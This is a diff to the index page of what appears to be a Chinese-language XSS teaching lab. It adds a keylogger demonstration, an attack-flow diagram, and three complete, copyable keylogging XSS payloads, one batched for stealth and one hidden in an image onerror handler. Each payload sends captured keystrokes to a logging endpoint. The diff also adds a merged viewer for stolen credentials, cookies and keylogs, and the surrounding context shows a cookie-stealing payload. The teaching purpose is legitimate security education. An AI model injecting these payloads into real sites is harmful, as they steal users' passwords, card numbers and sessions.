@@ -244,6 +244,22 @@
         </div>
 
         <div class="demo-grid">
+            <!-- XSS类型演示（入门模块） -->
+            <div class="demo-card" style="border: 2px solid #4ecdc4;">
+                <div class="card-header">
+                    <span class="card-icon">📚</span>
+                    <span class="card-title">XSS类型演示（入门）</span>
+                </div>
+                <p class="card-desc">XSS入门学习模块，详细介绍三种主要XSS类型：反射型、存储型、DOM型，包含原理说明和交互式演示。</p>
+                <div class="card-features">
+                    <div class="feature-item">⚡ 反射型XSS演示</div>
+                    <div class="feature-item">💾 存储型XSS演示</div>
+                    <div class="feature-item">🌐 DOM型XSS演示</div>
+                    <div class="feature-item">📖 原理与防御方法</div>
+                </div>
+                <a href="xss_types_demo.php" class="btn-demo" style="background: linear-gradient(135deg, #00b894, #00cec9);">开始学习</a>
+            </div>
+
             <!-- 存在漏洞的论坛 -->
             <div class="demo-card">
                 <div class="card-header">
@@ -289,6 +305,21 @@
                 <a href="payload_library.php" class="btn-demo">查看Payload库</a>
             </div>
 
+            <!-- 键盘记录演示 -->
+            <div class="demo-card">
+                <div class="card-header">
+                    <span class="card-icon">⌨️</span>
+                    <span class="card-title">键盘记录演示</span>
+                </div>
+                <p class="card-desc">演示XSS攻击中键盘记录的原理，实时捕获用户输入，包括密码等敏感信息。</p>
+                <div class="card-features">
+                    <div class="feature-item">实时键盘监听</div>
+                    <div class="feature-item">特殊按键捕获</div>
+                    <div class="feature-item">防御方法演示</div>
+                </div>
+                <a href="keylogger_demo.php" class="btn-demo">进入演示</a>
+            </div>
+
             <!-- XSS防御演示 -->
             <div class="demo-card">
                 <div class="card-header">
@@ -301,34 +332,21 @@
                 </div>
             </div>
 
-            <!-- 凭据查看器 -->
+            <!-- 数据查看器（整合版） -->
             <div class="demo-card">
                 <div class="card-header">
-                    <span class="card-icon">📊</span>
-                    <span class="card-title">凭据查看器</span>
+                    <span class="card-icon">🔍</span>
+                    <span class="card-title">数据查看器</span>
                 </div>
-                <p class="card-desc">查看所有被窃取的用户凭据，包括用户名、密码、IP地址等信息。</p>
+                <p class="card-desc">整合查看所有窃取的数据，包括凭据、Cookie、键盘记录，支持分页切换。</p>
                 <div class="card-features">
-                    <div class="feature-item">实时更新数据</div>
-                    <div class="feature-item">显示详细信息</div>
+                    <div class="feature-item">🔐 凭据查看</div>
+                    <div class="feature-item">🍪 Cookie查看</div>
+                    <div class="feature-item">⌨️ 键盘记录</div>
+                    <div class="feature-item">实时数据统计</div>
                     <div class="feature-item">支持清空数据</div>
                 </div>
-                <a href="view_credentials.php" class="btn-demo btn-danger">查看凭据</a>
-            </div>
-
-            <!-- Cookie查看器 -->
-            <div class="demo-card">
-                <div class="card-header">
-                    <span class="card-icon">🍪</span>
-                    <span class="card-title">Cookie查看器</span>
-                </div>
-                <p class="card-desc">查看所有被窃取的用户Cookie，包括Session ID、用户信息等敏感数据。</p>
-                <div class="card-features">
-                    <div class="feature-item">实时捕获Cookie</div>
-                    <div class="feature-item">显示完整Cookie内容</div>
-                    <div class="feature-item">支持清空数据</div>
-                </div>
-                <a href="view_cookies.php" class="btn-demo btn-danger">查看Cookie</a>
+                <a href="viewer.php" class="btn-demo btn-danger">查看数据</a>
             </div>
 
             <!-- 一键清理功能 -->
@@ -349,8 +367,12 @@
                             <span class="btn-text">清空凭据数据</span>
                         </button>
                         <button onclick="clearCookies()" class="btn-clean">
-                            <span class="btn-icon"></span>
+                            <span class="btn-icon">🍪</span>
                             <span class="btn-text">清空Cookie数据</span>
+                        </button>
+                        <button onclick="clearKeylogs()" class="btn-clean">
+                            <span class="btn-icon">⌨️</span>
+                            <span class="btn-text">清空键盘记录</span>
                         </button>
                     </div>
                     <div id="clearStatus" class="status-message"></div>
@@ -424,6 +446,41 @@
                     <div class="step-number">5</div>
                     <div class="step-title">身份冒充</div>
                     <div class="step-desc">使用Cookie冒充用户身份登录</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="flow-section" style="background: rgba(78, 205, 196, 0.1); border: 2px solid #4ecdc4;">
+            <h2 class="flow-title" style="color: #4ecdc4;">⌨️ 键盘记录攻击流程</h2>
+            <div class="flow-steps">
+                <div class="flow-step" style="background: rgba(78, 205, 196, 0.2);">
+                    <div class="step-number" style="background: #4ecdc4;">1</div>
+                    <div class="step-title">注入监听脚本</div>
+                    <div class="step-desc">攻击者在评论区注入键盘监听代码</div>
+                </div>
+                <div class="arrow" style="color: #4ecdc4;">→</div>
+                <div class="flow-step" style="background: rgba(78, 205, 196, 0.2);">
+                    <div class="step-number" style="background: #4ecdc4;">2</div>
+                    <div class="step-title">脚本自动执行</div>
+                    <div class="step-desc">用户访问页面，恶意脚本在后台运行</div>
+                </div>
+                <div class="arrow" style="color: #4ecdc4;">→</div>
+                <div class="flow-step" style="background: rgba(78, 205, 196, 0.2);">
+                    <div class="step-number" style="background: #4ecdc4;">3</div>
+                    <div class="step-title">捕获按键</div>
+                    <div class="step-desc">监听所有键盘事件，记录用户输入</div>
+                </div>
+                <div class="arrow" style="color: #4ecdc4;">→</div>
+                <div class="flow-step" style="background: rgba(78, 205, 196, 0.2);">
+                    <div class="step-number" style="background: #4ecdc4;">4</div>
+                    <div class="step-title">数据外传</div>
+                    <div class="step-desc">将按键数据发送到攻击者服务器</div>
+                </div>
+                <div class="arrow" style="color: #4ecdc4;">→</div>
+                <div class="flow-step" style="background: rgba(78, 205, 196, 0.2);">
+                    <div class="step-number" style="background: #4ecdc4;">5</div>
+                    <div class="step-title">提取敏感信息</div>
+                    <div class="step-desc">分析按键序列，提取密码等敏感数据</div>
                 </div>
             </div>
         </div>
@@ -514,6 +571,47 @@
                         <p class="explain-text">设置图片的src属性，浏览器会立即发起HTTP请求，Cookie被悄悄发送到攻击者服务器。</p>
                     </div>
                 </div>
+
+                <!-- 键盘记录Payload解析 -->
+                <div class="explain-card">
+                    <div class="explain-card-title">⌨️ 键盘记录 Payload 解析</div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">1️⃣ 注册事件监听</div>
+                        <div class="explain-code">document.addEventListener('keydown', handler)</div>
+                        <p class="explain-text">监听整个文档的键盘事件，用户在页面任何位置的按键都会被捕获。</p>
+                    </div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">2️⃣ 获取按键信息</div>
+                        <div class="explain-code">var key = e.key || e.keyCode</div>
+                        <p class="explain-text">从事件对象中获取按键值，包括字母、数字、特殊按键（Enter、Tab等）。</p>
+                    </div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">3️⃣ 特殊按键处理</div>
+                        <div class="explain-code">if(e.key==='Enter') key='[ENTER]'</div>
+                        <p class="explain-text">将特殊按键转换为可读标记，便于后续分析按键序列和提取密码。</p>
+                    </div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">4️⃣ 数据累积</div>
+                        <div class="explain-code">keystrokes += key</div>
+                        <p class="explain-text">将每次按键累积存储，形成完整的按键序列。</p>
+                    </div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">5️⃣ 批量发送</div>
+                        <div class="explain-code">if(keystrokes.length>20) send()</div>
+                        <p class="explain-text">累积一定数量后批量发送，减少请求次数，降低被检测风险。</p>
+                    </div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">6️⃣ 隐蔽传输</div>
+                        <div class="explain-code">new Image().src='log.php?k='+data</div>
+                        <p class="explain-text">使用Image对象发送数据，绕过跨域限制，无感传输。</p>
+                    </div>
+                </div>
             </div>
 
             <!-- 关键技术点 -->
@@ -551,6 +649,14 @@
                         <p class="explain-text">• 用户信任：页面看起来正常</p>
                         <p class="explain-text">• 无感操作：用户毫无察觉</p>
                         <p class="explain-text">• 自动执行：浏览器自动运行脚本</p>
+                    </div>
+                    
+                    <div class="explain-card">
+                        <div class="explain-card-title">⌨️ 键盘记录的危害</div>
+                        <p class="explain-text">• 窃取密码：捕获用户输入的账号密码</p>
+                        <p class="explain-text">• 获取敏感信息：信用卡号、身份证号等</p>
+                        <p class="explain-text">• 监控行为：了解用户操作习惯</p>
+                        <p class="explain-text">• 持续攻击：脚本持续运行直到页面关闭</p>
                     </div>
                 </div>
             </div>
@@ -591,6 +697,28 @@
 
 <span style="color: #8b949e;">// 3. 发送请求（浏览器会尝试加载这个图片）</span>
 img.<span style="color: #79c0ff;">src</span> = url;
+<span style="color: #ff7b72;">&lt;/script&gt;</span>
+
+<span style="color: #8b949e;">// 键盘记录完整Payload</span>
+<span style="color: #ff7b72;">&lt;script&gt;</span>
+<span style="color: #8b949e;">// 1. 定义存储变量</span>
+<span style="color: #ff7b72;">var</span> keys = <span style="color: #a5d6ff;">''</span>;
+
+<span style="color: #8b949e;">// 2. 注册键盘监听</span>
+<span style="color: #79c0ff;">document</span>.<span style="color: #d2a8ff;">addEventListener</span>(<span style="color: #a5d6ff;">'keydown'</span>, <span style="color: #ff7b72;">function</span>(e) {
+    <span style="color: #8b949e;">// 3. 处理特殊按键</span>
+    <span style="color: #ff7b72;">var</span> key = e.key;
+    <span style="color: #ff7b72;">if</span> (key === <span style="color: #a5d6ff;">'Enter'</span>) key = <span style="color: #a5d6ff;">'[ENTER]'</span>;
+    <span style="color: #ff7b72;">if</span> (key === <span style="color: #a5d6ff;">'Tab'</span>) key = <span style="color: #a5d6ff;">'[TAB]'</span>;
+    <span style="color: #ff7b72;">if</span> (key === <span style="color: #a5d6ff;">' '</span>) key = <span style="color: #a5d6ff;">'[SPACE]'</span>;
+    <span style="color: #8b949e;">// 4. 累积按键</span>
+    keys += key;
+    <span style="color: #8b949e;">// 5. 批量发送</span>
+    <span style="color: #ff7b72;">if</span> (keys.length >= <span style="color: #79c0ff;">20</span>) {
+        <span style="color: #ff7b72;">new</span> <span style="color: #d2a8ff;">Image</span>().<span style="color: #79c0ff;">src</span> = <span style="color: #a5d6ff;">'save_keylog.php?k='</span> + keys;
+        keys = <span style="color: #a5d6ff;">''</span>;
+    }
+});
 <span style="color: #ff7b72;">&lt;/script&gt;</span></pre>
                 </div>
             </div>
@@ -656,6 +784,61 @@ var img = new Image();
 img.src = 'steal_cookie.php?cookie=' + encodeURIComponent(document.cookie);
 "&gt;</div>
             <button class="copy-btn" onclick="copyPayload('payload6')">复制代码</button>
+
+            <h3 style="margin: 40px 0 10px; color: #4ecdc4;">⌨️ 键盘记录 Payload</h3>
+            <p style="color: #aaa; margin-bottom: 15px;">以下Payload可以监听用户键盘输入，记录密码等敏感信息：</p>
+            
+            <h4 style="margin: 20px 0 10px; color: #fff;">方式1：基础键盘记录</h4>
+            <div class="code-block" id="payload7">&lt;script&gt;
+document.addEventListener('keydown', function(e) {
+    var key = e.key;
+    if (key === 'Enter') key = '[ENTER]';
+    if (key === 'Tab') key = '[TAB]';
+    if (key === ' ') key = '[SPACE]';
+    if (key === 'Backspace') key = '[BACK]';
+    new Image().src = 'save_keylog.php?k=' + encodeURIComponent(key);
+});
+&lt;/script&gt;</div>
+            <button class="copy-btn" onclick="copyPayload('payload7')">复制代码</button>
+
+            <h4 style="margin: 20px 0 10px; color: #fff;">方式2：批量发送（更隐蔽）</h4>
+            <div class="code-block" id="payload8">&lt;script&gt;
+(function() {
+    var keys = '';
+    document.addEventListener('keydown', function(e) {
+        var key = e.key;
+        if (key === 'Enter') key = '[ENTER]';
+        if (key === 'Tab') key = '[TAB]';
+        if (key === ' ') key = '[SPACE]';
+        if (key === 'Backspace') key = '[BACK]';
+        keys += key;
+        if (keys.length >= 20) {
+            new Image().src = 'save_keylog.php?k=' + encodeURIComponent(keys);
+            keys = '';
+        }
+    });
+    window.addEventListener('beforeunload', function() {
+        if (keys) navigator.sendBeacon('save_keylog.php', keys);
+    });
+})();
+&lt;/script&gt;</div>
+            <button class="copy-btn" onclick="copyPayload('payload8')">复制代码</button>
+
+            <h4 style="margin: 20px 0 10px; color: #fff;">方式3：隐藏在图片错误事件中</h4>
+            <div class="code-block" id="payload9">&lt;img src="x" onerror="
+var k='';
+document.addEventListener('keydown',function(e){
+    var key=e.key;
+    if(key==='Enter')key='[ENTER]';
+    if(key===' ')key='[SPACE]';
+    k+=key;
+    if(k.length>=20){
+        new Image().src='save_keylog.php?k='+k;
+        k='';
+    }
+});
+"&gt;</div>
+            <button class="copy-btn" onclick="copyPayload('payload9')">复制代码</button>
         </div>
 
         <div style="text-align: center; color: #aaa; padding: 20px;">
@@ -678,22 +861,10 @@ img.src = 'steal_cookie.php?cookie=' + encodeURIComponent(document.cookie);
                 fetch('clear_forum_comments.php')
                     .then(response => response.json())
                     .then(data => {
-                        const statusDiv = document.getElementById('clearStatus');
-                        statusDiv.style.display = 'block';
-                        if(data.success) {
-                            statusDiv.innerHTML = '✅ ' + data.message;
-                            statusDiv.style.background = 'rgba(78, 205, 196, 0.2)';
-                        } else {
-                            statusDiv.innerHTML = '❌ ' + data.message;
-                            statusDiv.style.background = 'rgba(255, 107, 107, 0.2)';
-                        }
-                        setTimeout(() => statusDiv.style.display = 'none', 3000);
+                        showStatus(data.success ? 'success' : 'error', data.message);
                     })
                     .catch(error => {
-                        const statusDiv = document.getElementById('clearStatus');
-                        statusDiv.style.display = 'block';
-                        statusDiv.innerHTML = '❌ 清理失败：' + error;
-                        statusDiv.style.background = 'rgba(255, 107, 107, 0.2)';
+                        showStatus('error', '清理失败：' + error.message);
                     });
             }
         }
@@ -707,7 +878,7 @@ img.src = 'steal_cookie.php?cookie=' + encodeURIComponent(document.cookie);
                         showStatus(data.success ? 'success' : 'error', data.message);
                     })
                     .catch(error => {
-                        showStatus('error', '清理失败：' + error);
+                        showStatus('error', '清理失败：' + error.message);
                     });
             }
         }
@@ -721,7 +892,21 @@ img.src = 'steal_cookie.php?cookie=' + encodeURIComponent(document.cookie);
                         showStatus(data.success ? 'success' : 'error', data.message);
                     })
                     .catch(error => {
-                        showStatus('error', '清理失败：' + error);
+                        showStatus('error', '清理失败：' + error.message);
+                    });
+            }
+        }
+        
+        // 清空键盘记录
+        function clearKeylogs() {
+            if(confirm('确定要清空所有键盘记录吗？')) {
+                fetch('clear_keylogs.php')
+                    .then(response => response.json())
+                    .then(data => {
+                        showStatus(data.success ? 'success' : 'error', data.message);
+                    })
+                    .catch(error => {
+                        showStatus('error', '清理失败：' + error.message);
                     });
             }
         }
